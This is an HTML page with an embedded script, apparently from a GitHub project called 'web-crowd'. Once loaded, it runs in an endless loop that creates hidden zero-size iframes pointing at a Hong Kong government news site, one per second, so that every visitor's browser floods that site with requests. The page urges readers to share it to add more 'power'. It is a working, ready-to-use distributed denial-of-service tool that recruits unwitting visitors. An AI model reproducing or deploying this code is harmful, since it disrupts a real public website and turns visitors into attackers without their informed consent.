<!DOCTYPE html>
<html>
    <header>
        <style>
        .bottomStyle{
            bottom: 0;
            position: fixed;
            /* height: 80px; */
            background-color: lightgray;
            width: 100%;
            padding: 30px 0;
            text-align: center;
        }
        </style>
    </header>
<body>

    <h1 id='msgTitle'> I ðŸ’– you: </h1>
    <p> Share this site with your friend. We need bigger powser to say NO!</p>
    <p id='msg'></p>
    <p id='msgTotal'></p>

    <div class='bottomStyle'>
        Developer/Designer : <a href='https://github.com/hackhk2019/web-crowd'> https://github.com/hackhk2019/web-crowd </a>
    </div>

<script>
// const TARGET_URL = "http://www.tvb.com"
const TARGET_URL = "https://www.news.gov.hk/chi/index.html"
const MAX_COUNT = 3
const updateAndShowCount = (msg) => {
  document.getElementById("msg").innerHTML = msg;
}
const updateAndShowTotalCount = (msg) => {
  document.getElementById("msgTotal").innerHTML = msg;
}
const updateAndShowTitle = (msg) => {
  document.getElementById("msgTitle").innerHTML = msg;
}

const appendIFrame = () => {
    const iframe = document.createElement("iframe");
    iframe.src = TARGET_URL;
    iframe.width = "0";
    iframe.height = "0";
    document.body.appendChild(iframe); //Append iframe to body element
}

const removeAllIFrame = () => {
    const iframes = document.querySelectorAll("iframe"); //Get all iframes

    for(const item of iframes) {
        console.log('item: ', item)
        item.parentNode.removeChild(item)
    }
}

const sleep = (second = 1) => new Promise((resolve)=>{
    setTimeout(() => {
        return resolve()
    }, second * 1000);
})

window.onload = async function () {
	let count = 0; 
    let total = 0

    updateAndShowTitle(`I love you: ${TARGET_URL}`)

    while (true) {
        await sleep()

        if(count >=MAX_COUNT) {
            removeAllIFrame()
            count = 0 
            continue
        };

        appendIFrame()
        count += 1
        total += 1 
        updateAndShowCount(`Current opening ${count} : ${TARGET_URL}`)
        updateAndShowTotalCount(`Total opened ${total} : ${TARGET_URL}`)
    }
}
</script>
</body>
</html>
